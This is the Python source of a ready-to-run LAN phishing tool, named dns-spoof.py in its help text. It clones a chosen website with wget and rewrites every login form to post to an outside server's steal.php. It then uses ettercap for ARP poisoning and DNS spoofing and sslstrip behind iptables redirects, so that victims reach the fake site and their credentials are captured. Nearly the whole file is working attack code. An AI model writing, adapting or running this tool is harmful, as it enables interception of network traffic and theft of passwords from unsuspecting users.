import sys
import os
import subprocess
import shutil
import socket
import fcntl
import struct

# List of required programs
EXECUTABLES = ['nginx', 'ettercap', 'locate', 'wget', 'sslstrip']

def find_file(file_name):
    """
    Given a file name, finds and returns the file's absolute location.
    Uses the locate program found in Unix.
    """
    output = subprocess.Popen(['locate',file_name], stdout=subprocess.PIPE).communicate()[0]
    output_list = output.decode().split('\n')
    if file_name == 'nginx.conf' and '/etc/nginx/nginx.conf' in output_list:
        return '/etc/nginx/nginx.conf'
    if file_name == 'etter.dns' and '/etc/ettercap/etter.dns' in output_list:
        return '/etc/ettercap/etter.dns'
    found = False
    conf_path = ""
    index = 0
    while not found and index < len(output_list):
        curr_line = output_list[index].rsplit('/', 1)[-1]
        if curr_line == file_name:
            conf_path = output_list[index]
            found = True
        index += 1
    if conf_path == "":
        exit(file_name + " not found on system.")
    return conf_path

def find_line(f_data):
    """
    Finds line number of file that contains a certain string.
    """
    for i in range(len(f_data)):
        if 'location /' in f_data[i].strip() and '#' not in f_data[i]:
            return i

def update_nginx_conf(conf_path):
    """
    Updates the nginx.conf file so that the nginx
    document root will point to the correct file location.
    """
    try:
        with open(conf_path + '.default', 'r') as fd:
            fd_data = fd.readlines()
        fd_index = find_line(fd_data)
    except FileNotFoundError:
        subprocess.call(["cp",conf_path,conf_path+".default"])
        with open(conf_path + '.default', 'r') as fd:
            fd_data = fd.readlines()
        fd_index = find_line(fd_data)
    with open(conf_path, 'r') as f:
        f_data = f.readlines()
    if fd_index != -1:
        fd_path = fd_data[fd_index+1].split()[1][:-1]
    default_path = fd_path
    fd_path += sys.argv[1].rsplit('@',1)[-1]
    index = find_line(f_data)
    index += 1
    old_f_path = f_data[index].split()[1][:-1]
    f_data[index] = f_data[index].replace(old_f_path, fd_path)
    with open(conf_path, 'w') as f:
        for l in f_data:
            f.write(l)
    if not os.path.exists(default_path):
        os.makedirs(default_path)
    return default_path

def get_ip_address(ifname):
    """
    Gets the IP address given a network interface name.
    Credit goes to Stack Overflow answer.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
    )[20:24])

def update_etter_dns(conf_path):
    """
    Update the etter.dns file so that ettercap can
    DNS spoof the website name with the attacker's
    IP address.
    """
    try:
        ip_address = get_ip_address(sys.argv[2])
    except OSError:
        ip_address = input("Enter IP Address: ")
    subprocess.call(["rm",conf_path])
    new_line = sys.argv[1] + " A " + ip_address + "\n" + \
        sys.argv[1] + " PTR " + ip_address + "\n"
    if sys.argv[1].count('.') > 1:
        new_line += "*." + sys.argv[1].split('.',1)[1] + " A " + ip_address + "\n"
    with open(conf_path, 'w+') as f:
        if new_line not in f.read():
            f.write(new_line)

def update_form_action(login_path):
    """
    Updates the html files in the cloned website so that
    POST requests are sent to the attacker's malicious server.
    """
    with open(login_path, 'r', encoding='utf-8',errors='ignore') as f:
        f_data = f.readlines()
    index_list = []
    for i in range(len(f_data)):
        l = f_data[i].upper()
        if "FORM" in l and "ACTION" in l and "POST" in l:
            index_list.append(i)
    for index in index_list:
        split_line = f_data[index].split("\"")
        str_index = next(i for i, string in enumerate(split_line) if "ACTION" in string.upper())
        try:
            f_data[index] = f_data[index].replace(split_line[str_index+1],"http://107.170.206.166/steal.php")
        except IndexError:
            pass
    with open(login_path, 'w') as f:
        for l in f_data:
            f.write(l)

def update_pages(website_dir):
    """
    Finds html pages in the website directory
    and updates their POST requests.
    """
    for f in os.listdir(website_dir):
        # print(f)
        if os.path.isdir(website_dir + '/' + f):
            update_pages(website_dir + '/' + f)
        elif f.endswith(".html"):
            login_path = website_dir + "/" + f
            update_form_action(login_path)

def call_programs(default_path):
    """
    Calls programs like wget, sslstrip, and ettercap
    to conduct the exploit.
    """
    os.chdir(default_path)
    subprocess.call(["rm","-f","index.html"])
    try:
        subprocess.call(["wget","-e","robots=off","--recursive","--no-clobber","--page-requisites","--html-extension","--convert-links", "--restrict-file-names=windows","--domains",sys.argv[1],"--no-parent",sys.argv[1]])
    except KeyboardInterrupt:
        subprocess.call(["rm","hts-in_progress.lock"])
    update_pages(os.getcwd() + "/" + sys.argv[1].rsplit('@',1)[-1])
    subprocess.call(["service","nginx","restart"])
    subprocess.call(["iptables","--flush","-t","nat"])
    subprocess.call(["iptables","-t","nat","-A","PREROUTING","-i",sys.argv[2],"-p","tcp","--destination-port", \
        "80","-j","REDIRECT","--to-port","6666"])
    subprocess.Popen(["sslstrip","-l","6666"], stderr=subprocess.DEVNULL)
    subprocess.call(["ettercap","-T","-q","-M","arp","-P","dns_spoof","///","///","-i",sys.argv[2]])

def set_up_nginx(default_path):
    """
    Sets up the nginx configuration file so that
    the program can use it to create the local server.
    """
    subprocess.call(["wget","https://gist.githubusercontent.com/mxavier6/3d37de2b8a64c202c2077f5e636253ac/raw/4c5b3932d94a5d14f537201dc22f8fb5f1847dad/nginx.conf"])
    subprocess.call(["mv","nginx.conf",default_path.rsplit('/',1)[0]])
    output = subprocess.Popen(['cat','/etc/passwd'], stdout=subprocess.PIPE).communicate()[0]
    output_list = output.decode().split(':')

    if shutil.which("adduser") and not any('nginx' in string for string in output_list):
        subprocess.call(["adduser","--system","--no-create-home","--disabled-login","--disabled-password","--group","nginx"])

def check_executables():
    """
    Checks if the system has the necessary executables.
    """
    for e in EXECUTABLES:
        path_str = shutil.which(e)
        if path_str == None:
            exit("Dependency " + e + " is not found. Please install.")

def check_root():
    """
    Checks if program is run by the root user.
    """
    if os.geteuid() != 0:
        exit("You need root privileges to run this program.")

def print_help():
    exit("This program is used as a phishing attack on the local area network (LAN).\n" \
        "USAGE: python3 dns-spoof.py <website-name> <network interface name>\n" \
        "Example of <website-name> is www.google.com, example of network interface name is eth0, wlan0.\n" \
        "DEPENDENCIES: nginx, ettercap, locate, wget, sslstrip.\n" \
        "This program MUST be run as the ROOT user.\n" \
        "This program requires that PORTS 80 and 6666 are set as OPEN in the firewall.\n" \
        "Additionally, the /// arguments in the ettercap call should be changed to // if IPv6 support is not enabled.\n")

def main():
    """
    Runs the program and calls necessary methods.
    """
    try:
        if len(sys.argv) ==2 and sys.argv[1] == '-h':
            print_help()
        elif len(sys.argv) != 3:
            exit("Incorrect number of arguments, please execute with -h for details.")
        else:
            check_root()
            check_executables()
            default_nginx_path = update_nginx_conf(find_file("nginx.conf"))
            set_up_nginx(default_nginx_path)
            update_etter_dns(find_file("etter.dns"))
            print("Make sure ports 80 and 6666 are open in the firewall.\n")
            call_programs(default_nginx_path)
    except KeyboardInterrupt:
        exit()


if __name__ == '__main__':
    main()
